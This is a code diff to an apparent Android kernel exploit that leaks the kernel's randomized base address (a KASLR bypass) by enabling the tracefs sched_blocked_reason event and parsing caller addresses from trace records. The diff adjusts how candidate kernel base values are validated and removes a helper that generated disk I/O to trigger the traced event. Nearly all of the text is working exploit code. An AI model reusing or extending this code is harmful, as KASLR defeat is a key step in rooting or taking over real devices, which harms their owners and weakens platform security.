@@ -56,10 +56,21 @@ static int slide_tracefs_parse_page(
     if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
       uint64_t caller = 0;
       memcpy(&caller, page + record + 16, sizeof(caller));
-      uint64_t link_caller =
-          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
-      if (caller >= link_caller) {
-        uint64_t candidate = caller - link_caller;
+      if (caller > SLIDE_TRACEFS_WORKER_CALLER_OFF) {
+        uint64_t base = caller - SLIDE_TRACEFS_WORKER_CALLER_OFF;
+#if defined(KIMAGE_VIRTUAL_BASE_MIN) && defined(KIMAGE_VIRTUAL_BASE_MAX)
+        if ((base >> 48) == 0xffff && (base & 0x1fffffULL) == 0 &&
+            base >= KIMAGE_VIRTUAL_BASE_MIN &&
+            base <= KIMAGE_VIRTUAL_BASE_MAX) {
+          uint64_t candidate = base - KIMAGE_TEXT_BASE;
+          pr_success("slide tracefs caller=%016llx base=%016llx\n",
+                     (unsigned long long)caller,
+                     (unsigned long long)base);
+          *candidate_out = (uintptr_t)candidate;
+          return 1;
+        }
+#else
+        uint64_t candidate = base - KIMAGE_TEXT_BASE;
         if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
           pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                      (unsigned long long)caller,
@@ -67,60 +78,12 @@ static int slide_tracefs_parse_page(
           *candidate_out = (uintptr_t)candidate;
           return 1;
         }
+#endif
       }
     }
     pos = record + record_len;
   }
   return 0;
-}
-
-static int slide_tracefs_trigger(void) {
-  char path[96];
-  snprintf(path, sizeof(path), "/data/local/tmp/.s23-trace-io-%d", getpid());
-  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
-  if (fd < 0) {
-    pr_error("slide tracefs trigger open failed errno=%d\n", errno);
-    return 0;
-  }
-  size_t chunk_size = 0x40000;
-  unsigned char *chunk = calloc(1, chunk_size);
-  if (!chunk) {
-    int saved_errno = errno;
-    close(fd);
-    unlink(path);
-    errno = saved_errno;
-    pr_error("slide tracefs trigger alloc failed errno=%d\n", errno);
-    return 0;
-  }
-  int ok = 1;
-  for (int round = 0; round < 16 && ok; round++) {
-    size_t done = 0;
-    while (done < chunk_size) {
-      ssize_t wrote = write(fd, chunk + done, chunk_size - done);
-      if (wrote < 0 && errno == EINTR) {
-        continue;
-      }
-      if (wrote <= 0) {
-        ok = 0;
-        break;
-      }
-      done += (size_t)wrote;
-    }
-  }
-  free(chunk);
-  if (ok && fsync(fd) != 0) {
-    ok = 0;
-  }
-  int saved_errno = errno;
-  close(fd);
-  unlink(path);
-  errno = saved_errno;
-  if (!ok) {
-    pr_error("slide tracefs trigger write failed errno=%d\n", errno);
-    return 0;
-  }
-  pr_info("slide tracefs trigger bytes=%u\n", 16U * 0x40000U);
-  return 1;
 }
 
 static int slide_tracefs_leak_kernel_base(void) {
@@ -131,7 +94,9 @@ static int slide_tracefs_leak_kernel_base(void) {
   static const char event_enable[] =
       SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
 
-  if (!slide_tracefs_write(tracing_on, "0")) {
+  if (!slide_tracefs_write(tracing_on, "0") ||
+      !slide_tracefs_write(event_enable, "1") ||
+      !slide_tracefs_write(tracing_on, "1")) {
     pr_error("slide tracefs setup failed errno=%d\n", errno);
     return 0;
   }
@@ -139,16 +104,6 @@ static int slide_tracefs_leak_kernel_base(void) {
   int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
   if (trace_fd >= 0) {
     close(trace_fd);
-  }
-  if (!slide_tracefs_write(event_enable, "1") ||
-      !slide_tracefs_write(tracing_on, "1")) {
-    pr_error("slide tracefs setup failed errno=%d\n", errno);
-    return 0;
-  }
-  if (!slide_tracefs_trigger()) {
-    slide_tracefs_write(tracing_on, "0");
-    slide_tracefs_write(event_enable, "0");
-    return 0;
   }
   sleep(1);
   slide_tracefs_write(tracing_on, "0");
@@ -180,7 +135,11 @@ static int slide_tracefs_leak_kernel_base(void) {
     return 0;
   }
 
+#if defined(KIMAGE_VIRTUAL_BASE_MIN) && defined(KIMAGE_VIRTUAL_BASE_MAX)
+  slide_p0_offset = 0;
+#else
   slide_p0_offset = candidate;
+#endif
   kaslr_base = KIMAGE_TEXT_BASE + candidate;
   kaslr_slide = candidate;
   kaslr_done = 1;
